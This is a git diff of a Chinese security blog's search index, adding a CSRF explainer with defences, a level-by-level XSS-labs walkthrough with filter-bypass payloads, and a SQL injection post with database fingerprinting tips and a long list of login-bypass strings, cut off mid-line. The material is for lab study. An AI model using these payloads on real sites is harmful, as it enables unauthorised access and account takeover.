@@ -1,15 +1,83 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CSRF</title>
+    <title>CSRF漏洞</title>
     <url>/posts/3509412693.html</url>
-    <content><![CDATA[<p>CSRF (<strong>C</strong>ross-<strong>S</strong>ite <strong>R</strong>equest <strong>F</strong>orgery)，即<strong>跨站请求伪造</strong>，也称为<strong>One Click Attack</strong>，一键攻击，因为其通常会通过一个图片或者链接并<strong>诱导用户去点击</strong>，当用户点击这个图片或者链接后，<strong>这个链接通常包含了一些攻击性的操作和参数</strong>，即所谓的<strong>伪造的请求</strong>，就会<strong>以用户的身份</strong>向服务器发起这个伪造的请求，服务器收到这个伪造的请求后，就会认为是用户自己许可的操作，导致用户数据丢失等。</p>
+    <content><![CDATA[<h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><p>CSRF (<strong>C</strong>ross-<strong>S</strong>ite <strong>R</strong>equest <strong>F</strong>orgery)，即<strong>跨站请求伪造</strong>，也称为<strong>One Click Attack</strong>，一键攻击，因为其通常会通过一个图片或者链接并<strong>诱导用户去点击</strong>，当用户点击这个图片或者链接后（<strong>这个链接通常包含了一些攻击性的操作和参数</strong>，即所谓的<strong>伪造的请求</strong>）就会<strong>以用户的身份</strong>向服务器发起这个伪造的请求，服务器收到这个伪造的请求后，就会认为是用户自己许可的操作，导致用户数据丢失等。</p>
 <p>由于CSRF是伪造用户请求，并且以用户的身份向服务器发起请求，导致用户数据丢失，所以<strong>用户必须先登录获取对应的登录cookie</strong>之后，伪造的请求才会生效，才会导致用户数据丢失。</p>
 <p>所以<mark style="background-color: #F4A460">CSRF攻击的前提</mark>是:</p>
 <ul>
 <li>用户必须先登录信任网站，并且在本地生成对应的cookie；</li>
 <li>在用户没有登出的情况下，访问了危险网站；</li>
 </ul>
+<h2 id="DVWA-Low演示"><a href="#DVWA-Low演示" class="headerlink" title="DVWA-Low演示"></a>DVWA-Low演示</h2><p>1、首先输入两个不同的密码查看页面的回显，发现URL回显了具体值</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407241614736.png" alt="image-20240724161426695"></p>
+<p>2、那我们直接在URL上修改密码，发现直接修改成功了，这就是最简单的CSRF。</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407241615869.png" alt="image-20240724161543833"></p>
+<br>
+
+
+
+<h1 id="CSRF与SSRF、XSS的区别"><a href="#CSRF与SSRF、XSS的区别" class="headerlink" title="CSRF与SSRF、XSS的区别"></a>CSRF与SSRF、XSS的区别</h1><p><strong>XSS</strong>：通过在网页中嵌入恶意的<mark style="background-color: #F4A46">客户端</mark>脚本（通常是JavaScript）进行攻击。例如，在论坛发帖中插入一段恶意的JavaScript代码，这段代码如果包含请求外部服务器的内容，就是一种XSS攻击！</p>
+<p><strong>CSRF</strong>：也叫XSRF，是一种伪装成用户的攻击手段。在用户不知情的情况下，攻击者（<mark style="background-color: #F4A46">由客户端发起</mark>）会发送一些用户本不愿意发出的请求，如恶意发帖、删帖、改密码、发邮件等。</p>
+<p><strong>SSRF</strong>：一种由攻击者构造形成<mark style="background-color: #F4A46">由服务端发起</mark>请求的一个安全漏洞。一般情况下，<strong>SSRF</strong>是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当<strong>中间人</strong>或者<strong>跳板</strong>）</p>
+<h2 id="XSS与CSRF的区别"><a href="#XSS与CSRF的区别" class="headerlink" title="XSS与CSRF的区别"></a>XSS与CSRF的区别</h2><p>很多人容易混淆XSS和CSRF，虽然它们经常一起提及，但实际上是两种不同的攻击方式，目的也不同。</p>
+<ul>
+<li><strong>XSS</strong>：主要是一种<strong>技术手段</strong>，通过在网页中注入恶意脚本来攻击。</li>
+<li><strong>CSRF</strong>：则是一种<strong>攻击形式</strong>，通过伪造用户的请求来达到攻击目的。</li>
+</ul>
+<p>通常情况下，CSRF攻击是通过XSS实现的，这也是为什么CSRF有时被称为XSRF（用XSS手段实现的伪造请求）。</p>
+<p>不过，CSRF不一定要通过XSS来实现，也可以通过其他方式，如直接使用命令行伪造请求，只要通过合法验证即可。</p>
+<ul>
+<li><strong>XSS</strong>：重点在于如何实现（写一段恶意JavaScript脚本注入到网页中，用户访问后就会触发）。</li>
+<li><strong>CSRF</strong>：重点在于结果（只要发送了伪装成用户的请求，就是一次CSRF攻击）。</li>
+</ul>
+<h3 id="CSRF-与-XSS-的根本差异"><a href="#CSRF-与-XSS-的根本差异" class="headerlink" title="CSRF 与 XSS 的根本差异"></a>CSRF 与 XSS 的根本差异</h3><p><mark style="background-color: #F4A460">相同点</mark>CSRF和XSS都是客户端攻击，它们滥用同源策略，利用web应用程序和不知情的用户之间的信任关系。</p>
+<p><mark style="background-color: #F4A460">差异</mark></p>
+<p>1、XSS攻击遵循<strong>双向攻击模式</strong>，允许攻击者执行恶意脚本、访问响应，并将后续敏感数据发送到攻击者选择的目的地。</p>
+<p>CSRF是一种<strong>单向攻击机制</strong>，这意味着攻击者只能发起HTTP请求，但不能检索已发起请求的响应。</p>
+<p>2、CSRF攻击要求经过身份验证的用户<strong>处于活动会话中</strong>，而XSS攻击则不需要。</p>
+<p>在XSS攻击中，只要用户登录，就可以存储和交付有效载荷。</p>
+<p>3、CSRF<strong>攻击的范围有限</strong>，仅限于用户可以执行的操作，例如点击恶意链接或访问黑客的网站。</p>
+<p>相反，XSS攻击提供执行恶意脚本来执行攻击者所选择的任何活动，从而扩大了攻击的范围。</p>
+<h2 id="针对的攻击目标"><a href="#针对的攻击目标" class="headerlink" title="针对的攻击目标"></a>针对的攻击目标</h2><p><mark style="background-color: #F4A460">SSRF</mark>针对<strong>服务器</strong></p>
+<p><mark style="background-color: #F4A460">CSRF</mark>针对<strong>用户</strong></p>
+<p><mark style="background-color: #F4A460">XSS</mark>针对<strong>客户端浏览器</strong></p>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><ul>
+<li><p><mark style="background-color: #F4A460">XSS</mark>攻击者通常通过<strong>反射型XSS、存储型XSS和DOM型XSS</strong>三种方式来实现。</p>
+<p><strong>反射型XSS</strong>是将恶意脚本嵌入到网页中，当用户访问该页面时，脚本被执行；</p>
+<p><strong>存储型XSS</strong>是将恶意脚本存储在目标网站的数据库中，当其他用户访问受影响的页面时，脚本被执行；</p>
+<p><strong>DOM型XSS</strong>是通过修改页面的DOM结构来执行恶意脚本。</p>
+</li>
+<li><p><mark style="background-color: #F4A460">SSRF</mark>让服务器发起针对内网的请求</p>
+</li>
+<li><p><mark style="background-color: #F4A460">CSRF</mark>欺骗用户点击恶意链接访问网站</p>
+</li>
+</ul>
+<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p><strong>SSRF：</strong></p>
+<p>1、需要禁用一些没有必要开放的端口和协议；</p>
+<p>2、限制用户的输入；</p>
+<p>3、只允许用户选择预定义的URL；</p>
+<p>4、使用白名单进行过滤；</p>
+<p>5、只允许受信任的用户访问已知的安全的目标网站和URL；</p>
+<p>6、禁止页面跳转；</p>
+<p>7、限制内网的访问权限</p>
+<p><strong>CSRF：</strong></p>
+<p>1、采用Token、Referer进行验证</p>
+<p>2、尽量使用GET请求</p>
+<p>3、使用SameSite Cookie属性增强Cookie的安全性，不让其随跨站请求而发送</p>
+<p>4、验证码登录</p>
+<p><strong>XSS：</strong></p>
+<p>1、输入验证：对用户输入的数据进行过滤和校验，防止恶意脚本的注入。</p>
+<p>2、HttpOnly标记：在设置Cookie时，添加HttpOnly标记，防止恶意脚本通过document.cookie获取Cookie信息。</p>
+<p>3、使用CSP（内容安全策略）设置，限制浏览器执行某些资源的来源，使攻击者无法注入有害代码。</p>
+<p>4、输出编码：对输出到Web页面的数据进行编码，防止恶意脚本的执行。</p>
+<p>5、使用安全的框架和库，如ASP.NET MVC、Spring Security等。</p>
+<br>
+
+
+
+<p>参考文章：<a href="https://segmentfault.com/a/1190000007059639">javascript - 用大白话谈谈XSS与CSRF - 傍晚八点半 - SegmentFault 思否</a></p>
 ]]></content>
       <categories>
         <category>web漏洞</category>
@@ -24,9 +92,17 @@
     <url>/posts/1449552202.html</url>
     <content><![CDATA[<h2 id="level1（直接输入payload）"><a href="#level1（直接输入payload）" class="headerlink" title="level1（直接输入payload）"></a>level1（直接输入payload）</h2><p><strong>payload：</strong><code>&lt;script&gt;(alert)(1)&lt;/script&gt;</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221548191.png"></p>
+<br>
+
+
+
 <h2 id="level2（闭合符号绕过）"><a href="#level2（闭合符号绕过）" class="headerlink" title="level2（闭合符号绕过）"></a>level2（闭合符号绕过）</h2><p>输入<code>&lt;script&gt;(alert)(1)&lt;/script&gt;</code>发现不行，查看源代码发现我们的payload被转义了，这里使用<code>&quot;&gt;</code>对它进行闭合即可绕过。</p>
 <p><strong>payload：</strong><code>&quot;&gt;&lt;script&gt;(alert)(1)&lt;/script&gt;</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221555242.png" alt="image-20240722155539201"></p>
+<br>
+
+
+
 <h2 id="level3（onclick绕过htmlspecialchars）"><a href="#level3（onclick绕过htmlspecialchars）" class="headerlink" title="level3（onclick绕过htmlspecialchars）"></a>level3（onclick绕过htmlspecialchars）</h2><p>1、输入payload后发现<code>&lt;&gt;</code>被转成html实体了，那这里就不能使用<code>&#39;&gt;</code>进行闭合了。</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221604143.png" alt="image-20240722160459109"></p>
 <p>2、查看源码发现这道题使用<strong>htmlspecialchars</strong>函数把预定义的字符<code>&amp;  &quot;  &#39;  &lt;  &gt;</code>转换为HTML实体，防止浏览器将其作为HTML元素,</p>
@@ -34,31 +110,59 @@
 <p>3、在输入payload后点击输入框即可过关</p>
 <p><strong>payload:</strong><code>&#39;onclick=&#39;alert(1)</code>（第一个单引号和value闭合，后面的单引号联合将alert包裹起来）</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221623848.png" alt="image-20240722162301811"></p>
+<br>
+
+
+
 <h2 id="level4（onclick绕过）"><a href="#level4（onclick绕过）" class="headerlink" title="level4（onclick绕过）"></a>level4（onclick绕过）</h2><p>输入payload后查看源代码发现<code>&lt;</code>和<code>&gt;</code>被过滤掉了，但是这里和第三关差不多，使用双引号闭合配合onclick即可</p>
 <p><strong>payload：</strong><code>&quot;onclick=&quot;alert(1)</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221627186.png" alt="image-20240722162709142"></p>
+<br>
+
+
+
 <h2 id="level5（js绕过）"><a href="#level5（js绕过）" class="headerlink" title="level5（js绕过）"></a>level5（js绕过）</h2><p>1、输入payload查看源代码发现payload前面的<code>&lt;script&gt;</code>被修改成了<code>&lt;scr_ipt&gt;</code>，说明<code>&lt;script&gt;</code>被过滤了，尝试<code>onclick</code>发现<code>on</code>也被过滤了。</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221639194.png" alt="image-20240722163913145"></p>
 <p>2、把<code>javascript:</code> 后面的代码当JavaScript来执行从而实现绕过。</p>
 <p>输入payload后点击click就能进入level6了。</p>
 <p><strong>payload：</strong><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221655553.png" alt="image-20240722165518514"></p>
+<br>
+
+
+
 <h2 id="level6（大小写绕过）"><a href="#level6（大小写绕过）" class="headerlink" title="level6（大小写绕过）"></a>level6（大小写绕过）</h2><p>经过尝试，发现script、on、src、href都被过滤了，找payload时发现可能是大小写绕过，在输入payload后点击click即可下一关。</p>
 <p><strong>payload：</strong><code>&quot;&gt;&lt;a Href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221707308.png" alt="image-20240722170726253"></p>
+<br>
+
+
+
 <h2 id="level7（双写绕过）"><a href="#level7（双写绕过）" class="headerlink" title="level7（双写绕过）"></a>level7（双写绕过）</h2><p>输入<code>&lt;script、on、src、href、data</code>，发现都被过滤了，大小写也过滤了，这里使用双写绕过即可过关</p>
 <p><strong>payload：</strong><code>&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/sscriptcript&gt;</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221711755.png" alt="image-20240722171150718"></p>
+<br>
+
+
+
 <h2 id="level8（html编码绕过）"><a href="#level8（html编码绕过）" class="headerlink" title="level8（html编码绕过）"></a>level8（html编码绕过）</h2><p>1、输入<code>&quot;&gt;&#39;&gt;&lt;script、on、src、href、data</code>进行尝试，发现除了单引号，其他都被过滤了，那么这里应该要使用编码绕过了</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221721324.png"></p>
 <p>2、同时留意到经过处理后的字符串是在<code>a href</code>标签内的，那么我们可以将<code>javascript:alert(1)</code>进行html编码，输入后再点击“友情链接”即可</p>
 <p><strong>payload：</strong><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
+<br>
+
+
+
 <h2 id="level9（判断是否需要http-）"><a href="#level9（判断是否需要http-）" class="headerlink" title="level9（判断是否需要http:&#x2F;&#x2F;）"></a>level9（判断是否需要http:&#x2F;&#x2F;）</h2><p>1、输入<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>来查看过滤了什么，发现回显链接不合法</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221734988.png" alt="image-20240722173432935"></p>
 <p>2、查看源码发现这里如果没有<code>http://</code>那么会回显链接不合法。</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221736840.png" alt="image-20240722173614795"></p>
 <p>3、那我们在上一题的后面添加上<code>http://</code>，并使用注释符将它注释起来防止执行不了弹窗。</p>
 <p><strong>payload：</strong><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;/* http:// */</code></p>
+<br>
+
+
+
 <h2 id="level10（hiden修改）"><a href="#level10（hiden修改）" class="headerlink" title="level10（hiden修改）"></a>level10（hiden修改）</h2><p>1、输入<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>检测发现数据被隐藏了</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221745605.png" alt="image-20240722174555543"></p>
 <p>2、查看源码，发现这里是get传参<code>t_sort</code>，并过滤掉了&lt;&gt;号，不能闭合插入标签，但是我们还能用onfocus事件，因为这里输入框被隐藏了，需要添加<code>type=&quot;text&quot;</code>，构造payload</p>
@@ -66,6 +170,10 @@
 <p>3、直接get传参payload后点击输入框即可</p>
 <p><strong>payload：</strong><code>?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407221909094.png"></p>
+<br>
+
+
+
 <h2 id="level11（referer头注入）"><a href="#level11（referer头注入）" class="headerlink" title="level11（referer头注入）"></a>level11（referer头注入）</h2><p>1、查看源码发现这道题也是隐藏了value值，但是有一个特殊的点，这题多了一个参数<code>t_ref</code>，并且它的参数是前一个页面的地址，那么我们可以猜测这个参数就是referer头</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231550492.png" alt="image-20240723155042377"></p>
 <p>2、使用burpsuite进行抓包，添加Referer头，内容为<code>&quot; onfocus=javascript:alert() type=&quot;text</code></p>
@@ -73,15 +181,31 @@
 <p>3、放包后点击输入框即可下一关</p>
 <p><strong>payload：</strong><code>Referer: &quot; onfocus=javascript:alert() type=&quot;text</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231557725.png" alt="image-20240723155716685"></p>
+<br>
+
+
+
 <h2 id="level12（User-Agent头注入）"><a href="#level12（User-Agent头注入）" class="headerlink" title="level12（User-Agent头注入）"></a>level12（User-Agent头注入）</h2><p>1、查看源代码发现新的参数是UA头，那这一题的思路和上一题的差不多</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231603520.png" alt="image-20240723160306481"></p>
 <p>2、抓包后重放再点击输入框即可</p>
 <p><strong>payload：</strong><code>&quot; onfocus=javascript:alert() type=&quot;text</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231604068.png" alt="image-20240723160418038"></p>
+<br>
+
+
+
 <h2 id="level13（cookie头注入）"><a href="#level13（cookie头注入）" class="headerlink" title="level13（cookie头注入）"></a>level13（cookie头注入）</h2><p>这一题跟上面两题都差不多，只不过要在cookie处进行注入，在<code>Cookie： user=</code>后面填入payload即可</p>
 <p><strong>payload：</strong><code>&quot; onfocus=javascript:alert() type=&quot;text</code></p>
+<br>
+
+
+
 <h2 id="level14（没完成）"><a href="#level14（没完成）" class="headerlink" title="level14（没完成）"></a>level14（没完成）</h2><p>这道题就给了一个网站，但是这个网站无法访问，下一题。</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231615765.png" alt="image-20240723161510731"></p>
+<br>
+
+
+
 <h2 id="level15（ng-include）"><a href="#level15（ng-include）" class="headerlink" title="level15（ng-include）"></a>level15（ng-include）</h2><p>1、查看源代码发现<strong>ng-include</strong>，搜索得知<strong>ng-include</strong>指令用于包含外部的 HTML 文件。</p>
 <p><code>ng-include</code>属性的值如果是一个表达式，返回一个文件名，如果包涵的内容是地址，需要加引号。</p>
 <p>默认情况下，包含的文件需要包含在同一个域名下。</p>
@@ -92,10 +216,18 @@
 <p>4、我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<code>&lt;script&gt;</code>，但是可以包涵那些标签的东西比如<code>&lt;a&gt;、&lt;input&gt;、&lt;img&gt;、&lt;p&gt;</code>标签等等，这些标签是能<mark style="background-color: #F4A460">需要我们手动点击弹窗的</mark>）我们手动点击Click即可</p>
 <p><strong>payload：</strong><code>?src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;Click&lt;/a&gt;&#39;</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231637554.png" alt="image-20240723163736461"></p>
+<br>
+
+
+
 <h2 id="level16（回车绕过空格）"><a href="#level16（回车绕过空格）" class="headerlink" title="level16（回车绕过空格）"></a>level16（回车绕过空格）</h2><p>1、输入<code>&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>检测这道题过滤了什么，得知这里过滤了<strong>srcipt和空格</strong></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231643747.png" alt="image-20240723164347701"></p>
 <p>2、尝试用<code>/</code>来替代空格也不行，这里可以用回车来代替绕过，回车的url编码是<code>%0a</code></p>
 <p>payload：<code>&lt;img%0asrc%0aonerror=alert(1)&gt;</code></p>
+<br>
+
+
+
 <h2 id="level17（embed标签，拼接绕过）"><a href="#level17（embed标签，拼接绕过）" class="headerlink" title="level17（embed标签，拼接绕过）"></a>level17（embed标签，拼接绕过）</h2><p>1、查看源代码发现，这道题引用了swf文件（FLASH插件的文件）并且有embed标签（<code>&lt;embed&gt;</code> 标签定义了一个容器，用来嵌入外部应用或者互动程序（插件））</p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231703720.png" alt="image-20240723170342677"></p>
 <p>2、这里我去后端改了一下代码，将后端第十七关的代码（level17.php）指向的swf文件改为<code>index.png</code>（效果是一样的）</p>
@@ -103,8 +235,16 @@
 <p>输入payload后点击图片即可</p>
 <p><strong>payload：</strong><code>?arg02= onclick=alert()</code></p>
 <p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407231721646.png" alt="image-20240723172133575"></p>
+<br>
+
+
+
 <h2 id="level18（拼接绕过）"><a href="#level18（拼接绕过）" class="headerlink" title="level18（拼接绕过）"></a>level18（拼接绕过）</h2><p>这里首先和第十七题一样，先更改swf文件成index.png，输入payload即可</p>
 <p><strong>payload：</strong><code>?arg02= onclick=alert()</code></p>
+<br>
+
+
+
 <h2 id="level19、20（反编译）"><a href="#level19、20（反编译）" class="headerlink" title="level19、20（反编译）"></a>level19、20（反编译）</h2><p>这里涉及到了flash的反编译，放弃了。</p>
 ]]></content>
       <categories>
@@ -115,9 +255,58 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL</title>
+    <title>SQL注入漏洞</title>
     <url>/posts/1299261525.html</url>
-    <content><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h3><ul>
+    <content><![CDATA[<h1 id="SQL数据库类型判断"><a href="#SQL数据库类型判断" class="headerlink" title="SQL数据库类型判断"></a>SQL数据库类型判断</h1><p>常见的数据库：Oracle、MySQL、SQL Server、Access、Postgresql，mongodb等</p>
+<h2 id="前端与数据库类型"><a href="#前端与数据库类型" class="headerlink" title="前端与数据库类型"></a>前端与数据库类型</h2><p><strong>asp：</strong>SQL Server，Access<br><strong>.net：</strong>SQL Server<br><strong>php：</strong>MySQL，PostgreSQL<br><strong>java：</strong>Oracle，MySQL</p>
+<h2 id="根据数据库特有函数来判断"><a href="#根据数据库特有函数来判断" class="headerlink" title="根据数据库特有函数来判断"></a>根据数据库特有函数来判断</h2><h3 id="len和length"><a href="#len和length" class="headerlink" title="len和length"></a>len和length</h3><p>len()：SQL Server 、MySQL以及db2返回长度的函数。<br>length()：Oracle和INFORMIX返回长度的函数。</p>
+<h3 id="version和-version"><a href="#version和-version" class="headerlink" title="version和@@version"></a>version和@@version</h3><p><strong>SQL Server：</strong>select@@version –<br><strong>Oracle</strong> :select banner from v$version<br><strong>MySQL：</strong>select @@version，version() –<br><strong>PostgreSQL:</strong> select version() –</p>
+<h3 id="substring和substr"><a href="#substring和substr" class="headerlink" title="substring和substr"></a>substring和substr</h3><p>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
+<h2 id="根据特殊符号进行判断"><a href="#根据特殊符号进行判断" class="headerlink" title="根据特殊符号进行判断"></a>根据特殊符号进行判断</h2><p><code>/*</code>是MySQL数据库的注释符<br><code>--</code>是Oracle和SQL Server支持的注释符<br><code>;</code>是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br><code>#</code>是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持<code>--</code> 和<code>/**/</code></p>
+<h2 id="数据库特有表"><a href="#数据库特有表" class="headerlink" title="数据库特有表"></a>数据库特有表</h2><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>表名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td>information_schema.tables</td>
+</tr>
+<tr>
+<td>Access</td>
+<td>msysobjects</td>
+</tr>
+<tr>
+<td>SQL Server</td>
+<td>sysobjects</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>all_tables</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>pg_catalog.pg_tables</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>sqlite_master</td>
+</tr>
+</tbody></table>
+<br>
+
+
+
+<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="MySQL渗透思路"><a href="#MySQL渗透思路" class="headerlink" title="MySQL渗透思路"></a>MySQL渗透思路</h3><ol>
+<li>端口、版本信息收集</li>
+<li>数据库管理信息收集</li>
+<li>暴力破解</li>
+<li>查看是否有源代码或文件包泄露漏洞</li>
+<li>使用phpMyAdmin账号获取webshell，或利用CMS漏洞获取webshell</li>
+</ol>
+<h3 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h3><ul>
 <li>Boolean（布尔注入）</li>
 <li>Union（联合注入）</li>
 <li>Into Outfile（数据导出语句）</li>
@@ -153,7 +342,7 @@
 <li>文件包含</li>
 <li>数据库备份拿shell</li>
 </ul>
-<h3 id="万能密码示例"><a href="#万能密码示例" class="headerlink" title="万能密码示例"></a>万能密码示例</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or&#x27;</span><span class="operator">=</span><span class="string">&#x27;or&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="常用万能密码"><a href="#常用万能密码" class="headerlink" title="常用万能密码"></a>常用万能密码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or&#x27;</span><span class="operator">=</span><span class="string">&#x27;or&#x27;</span></span><br><span class="line"><span class="string">&#x27; or 1=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="operator">=</span><span class="string">&#x27;or&#x27;</span></span><br><span class="line">admin</span><br><span class="line">admin<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">admin&#x27;</span> <span class="keyword">or</span> <span class="number">4</span><span class="operator">=</span><span class="number">4</span><span class="comment">--</span></span><br><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;--</span></span><br><span class="line"><span class="string">admin888</span></span><br><span class="line"><span class="string">&quot;or &quot;a&quot;=&quot;a</span></span><br><span class="line"><span class="string">admin&#x27;</span> <span class="keyword">or</span> <span class="number">2</span><span class="operator">=</span><span class="number">2</span>#</span><br><span class="line">a<span class="string">&#x27; having 1=1#</span></span><br><span class="line"><span class="string">a&#x27;</span> <span class="keyword">having</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">2</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br><span class="line"><span class="string">&#x27;)or(&#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br><span class="line"><span class="keyword">or</span> <span class="number">4</span><span class="operator">=</span><span class="number">4</span><span class="comment">--</span></span><br><span class="line">c</span><br><span class="line">a<span class="string">&#x27;or&#x27;</span> <span class="number">4</span><span class="operator">=</span><span class="number">4</span><span class="comment">--</span></span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;<span class="keyword">or</span>&quot;=&quot;a<span class="string">&#x27;=&#x27;</span>a</span><br><span class="line"><span class="string">&#x27;or&#x27;&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="operator">=</span><span class="string">&#x27;or&#x27;</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">4</span><span class="operator">=</span><span class="number">4</span></span><br><span class="line"><span class="string">&#x27;OR 4=4%00</span></span><br><span class="line"><span class="string">&quot;or 4=4%00</span></span><br><span class="line"><span class="string">&#x27;</span>xor</span><br><span class="line">admin<span class="string">&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">-1</span><span class="operator">%</span>cf<span class="string">&#x27; union select 1,1,1 as password,1,1,1 %23</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">17..admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a 密码随便</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">or</span><span class="string">&#x27;=&#x27;</span><span class="keyword">or</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">or</span> <span class="number">4</span><span class="operator">=</span><span class="number">4</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">something</span></span><br><span class="line"><span class="comment">&#x27; OR &#x27;1&#x27;=&#x27;1</span></span><br><span class="line"><span class="comment">1&#x27;or&#x27;1&#x27;=&#x27;1</span></span><br><span class="line"><span class="comment">admin&#x27; OR 4=4/*</span></span><br><span class="line"><span 